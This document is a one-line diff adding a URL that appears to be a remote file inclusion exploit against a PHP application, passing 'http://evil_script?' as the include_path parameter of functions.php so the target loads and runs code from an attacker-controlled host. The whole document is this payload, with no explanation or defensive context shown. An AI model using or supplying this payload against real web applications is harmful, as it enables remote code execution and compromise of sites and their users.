@@ -1,0 +1,1 @@
+http://www.example.com/[Script Path]/functions.php?include_path=http://evil_script?
